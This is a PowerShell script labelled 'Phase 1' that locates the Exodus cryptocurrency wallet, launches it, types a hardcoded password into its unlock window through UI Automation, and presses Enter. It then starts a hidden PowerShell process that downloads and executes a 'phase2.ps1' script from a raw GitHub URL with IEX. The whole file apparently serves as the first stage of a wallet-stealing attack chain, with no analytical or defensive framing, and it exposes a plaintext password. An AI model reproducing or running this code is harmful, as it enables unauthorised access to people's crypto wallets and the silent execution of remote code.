# === Phase 1: Login & spawn Phase2 ===
Add-Type -AssemblyName UIAutomationClient

function Wait-ForWindow {
    param([string]$pattern,[int]$timeout=30)
    $root=[System.Windows.Automation.AutomationElement]::RootElement
    $end=(Get-Date).AddSeconds($timeout)
    while((Get-Date)-lt $end){
        $wins=$root.FindAll([System.Windows.Automation.TreeScope]::Children,
            [System.Windows.Automation.Condition]::TrueCondition)
        foreach($w in $wins){ if($w.Current.Name -match $pattern){ return $w } }
        Start-Sleep -Milliseconds 300
    }
    return $null
}

function Launch-Exodus {
    Write-Host "[INFO] Searching for Exodus.exe..."
    $exodusPath = Get-ChildItem "$env:LOCALAPPDATA\exodus" -Recurse -Include "Exodus.exe" -ErrorAction SilentlyContinue |
                  Select-Object -First 1 -ExpandProperty FullName
    if (-not $exodusPath) {
        $exodusPath = Get-ChildItem "$env:ProgramFiles","$env:ProgramFiles(x86)" -Recurse -Include "Exodus.exe" -ErrorAction SilentlyContinue |
                      Select-Object -First 1 -ExpandProperty FullName
    }
    if (-not $exodusPath) { Write-Host "[ERROR] Exodus.exe not found."; exit 1 }
    Write-Host "[INFO] Found Exodus at: $exodusPath"
    Start-Process -FilePath $exodusPath
}

function FillPasswordAndLogin {
    param($password)

    Write-Host "[INFO] Waiting for login window..."
    $loginWin = Wait-ForWindow "Enter Password" 25
    if(-not $loginWin){ Write-Host "[ERR] Login window not found."; exit 1 }

    # find password field
    $editCond=New-Object System.Windows.Automation.PropertyCondition(
        [System.Windows.Automation.AutomationElement]::ControlTypeProperty,
        [System.Windows.Automation.ControlType]::Edit
    )
    $pwdBox=$loginWin.FindFirst([System.Windows.Automation.TreeScope]::Descendants,$editCond)
    if(-not $pwdBox){ Write-Host "[ERR] Password field not found."; exit 1 }
    $vp=$pwdBox.GetCurrentPattern([System.Windows.Automation.ValuePattern]::Pattern)
    $vp.SetValue($password)
    Write-Host "[INFO] Password filled."

    # press Enter
    $wshell=New-Object -ComObject WScript.Shell
    $wshell.AppActivate("Enter Password")
    Start-Sleep -Milliseconds 150
    $wshell.SendKeys("{ENTER}")
    Write-Host "[INFO] Pressed Enter to unlock."
}

# === MAIN LOGIN ===
$exodusPassword = "!Mamoute901"

Launch-Exodus
FillPasswordAndLogin $exodusPassword

# Allow ~3s for Exodus to open main UI
Start-Sleep -Seconds 3

# === Spawn hidden Phase2 ===
$phase2Url = "https://raw.githubusercontent.com/bangbangme/loko/refs/heads/main/phase2.ps1"
Write-Host "[INFO] Spawning Phase2 as hidden child process..."
Start-Process powershell -WindowStyle Hidden -ArgumentList "-nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('$phase2Url')"

Write-Host "[INFO] Phase1 exiting cleanly."
exit
